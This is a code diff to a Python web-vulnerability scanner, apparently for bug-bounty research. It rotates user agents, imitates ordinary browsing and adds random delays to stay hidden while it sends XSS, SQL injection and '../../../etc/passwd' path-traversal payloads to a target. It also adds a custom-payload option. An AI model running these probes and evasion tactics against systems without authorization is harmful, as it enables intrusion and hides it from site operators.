@@ -16,22 +16,22 @@ signal.signal(signal.SIGINT, sigint_handler)
 def prepare_headers(target):
     return {
         "User-Agent": random.choice([
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
-            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
-            "Mozilla/5.0 (Linux; Android 11; SM-G991B)"
+            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36",
+            "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X)",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/112.0.0.0 Safari/537.36"
         ]),
-        "Accept-Language": random.choice(["en-US", "en", "sr-RS"]),
-        "X-HackerOne-Research": "Whitefox980H1_Base64: V2hpdGVmb3g5ODBIMQ==",
-        "X-Requested-With": "XMLHttpRequest"
+        "Accept-Language": random.choice(["en-US", "en", "sr"]),
+        "Referer": target,
+        "X-Requested-With": "XMLHttpRequest",
+        "X-HackerOne-Research": "Whitefox980H1_Base64: V2hpdGVmb3g5ODBIMQ=="
     }
-
 # — Mimikrija korisnika — #
 def stealth_behavior(target):
     paths = ["/", "/about", "/contact", "/search?q=help"]
     fake_url = target.rstrip("/") + random.choice(paths)
     try:
         requests.get(fake_url, headers=prepare_headers(target), timeout=5)
-        time.sleep(random.randint(2, 4))
+        time.sleep(random.randint(6, 12))
     except:
         pass
 
@@ -43,14 +43,20 @@ default_payloads = [
     "../../../etc/passwd"
 ]
 
-stealth_payloads = [
-    "<template><script>alert(1)</script></template>",
-    "<noscript><template>' OR '1'='1</template></noscript>",
-    "<form><input name='note' value='<script>alert(1)</script>'></form>",
-    "<textarea><!--<script>alert(1)</script>--></textarea>",
-    "{\"action\":\"test\",\"token\":\"<svg onload=alert('xss')>\"}"
-]
+import argparse
 
+# Argument parser
+parser = argparse.ArgumentParser()
+parser.add_argument("--payload", help="Custom payload to use", type=str)
+args = parser.parse_args()
+
+# Payload lista (dinamička ili default)
+stealth_payloads = [args.payload] if args.payload else [
+    "<script>alert(1)</script>",
+    "<img src=x onerror=alert('xss')>",
+    "' OR '1'='1",
+    "../../../etc/passwd"
+]
 # — CSP detekcija — #
 def has_csp(target):
     try:
@@ -86,7 +92,7 @@ def run_shadowfox_mimic(target):
         try:
             r = requests.get(full_url, headers=prepare_headers(target), timeout=7)
             print(f"[{r.status_code} :: {detect_type(p)}] {full_url}")
-            time.sleep(random.randint(3, 7))
+            time.sleep(random.uniform(2.5, 4.0))
         except Exception as e:
             print(f"[ERROR] {full_url} → {str(e)}")
 
